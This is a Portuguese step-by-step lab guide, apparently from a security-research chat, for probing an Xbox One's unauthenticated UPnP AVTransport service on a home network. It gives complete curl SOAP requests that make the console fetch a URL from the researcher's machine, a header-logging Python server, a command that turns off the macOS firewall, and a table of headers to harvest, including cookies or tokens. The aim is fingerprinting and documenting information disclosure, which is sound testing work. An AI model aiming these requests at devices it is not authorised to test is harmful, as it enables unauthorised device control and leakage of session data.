- **Xbox One:** `192.168.1.29:2869`
- **Meu Mac:** `192.168.1.62`
- `SetAVTransportURI` executa (confirmado — abriu Films & TV)
- `Play` ainda não testado após o Set

---

**Step 1 — Sobe o listener**

```bash
# Terminal 1 — mantém aberto durante todo o lab
sudo tcpdump -i en0 src 192.168.1.29 -n -v
```

```bash
# Terminal 2 — servidor HTTP que vai receber o GET do Xbox
mkdir /tmp/lab && cd /tmp/lab
python3 -m http.server 8080
```

---

**Step 2 — Seta a URI apontando pro teu host**

```bash
# Terminal 3
curl -s -X POST "http://192.168.1.29:2869/upnphost/udhisapi.dll?control=uuid:db0f5c91-fb57-409b-b6b1-7ee886522e08+urn:upnp-org:serviceId:AVTransport" \
  -H 'SOAPAction: "urn:schemas-upnp-org:service:AVTransport:1#SetAVTransportURI"' \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <u:SetAVTransportURI xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">
      <InstanceID>0</InstanceID>
      <CurrentURI>http://192.168.1.62:8080/test.mp4</CurrentURI>
      <CurrentURIMetaData></CurrentURIMetaData>
    </u:SetAVTransportURI>
  </s:Body>
</s:Envelope>'
```

Observa o tcpdump — se aparecer pacote do `.29` o request saiu.

---

**Step 3 — Dispara o Play imediatamente após**

```bash
curl -s -X POST "http://192.168.1.29:2869/upnphost/udhisapi.dll?control=uuid:db0f5c91-fb57-409b-b6b1-7ee886522e08+urn:upnp-org:serviceId:AVTransport" \
  -H 'SOAPAction: "urn:schemas-upnp-org:service:AVTransport:1#Play"' \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <u:Play xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">
      <InstanceID>0</InstanceID>
      <Speed>1</Speed>
    </u:Play>
  </s:Body>
</s:Envelope>'
```

---

**Step 4 — Se o GET chegar, captura os headers**

No terminal do python server você vai ver algo assim:

```
192.168.1.29 - - [24/Apr/2026 ...] "GET /test.mp4 HTTP/1.1" 404 -
```

O que interessa é o **User-Agent** e headers adicionais. Para capturar mais detalhe troca o python server por isto:

```python
# /tmp/lab/server.py
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print("\n=== REQUEST ===")
        print(f"Path: {self.path}")
        print("Headers:")
        for k, v in self.headers.items():
            print(f"  {k}: {v}")
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
```

```bash
python3 /tmp/lab/server.py
```

---

**Step 5 — Se o GET não chegar, desabilita firewall e testa acessibilidade**

```bash
# Desabilita firewall macOS temporariamente
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off

# Confirma que a porta está acessível de outro dispositivo na rede
# (do celular ou outro host)
curl http://192.168.1.62:8080/
```

---

**O que estamos procurando no Step 4:**

| Header | O que revela |
|---|---|
| `User-Agent` | Firmware/OS version do Xbox |
| `Range` | Confirma que é player de mídia |
| `getcontentfeatures.dlna.org` | Capabilities DLNA exatas |
| `transferMode.dlna.org` | Modo de transferência |
| Cookies/tokens | Sessão ativa se algum app estiver aberto |

Esses headers sem autenticação nenhuma já constituem information disclosure documentável num relatório. Cola aqui o que aparecer.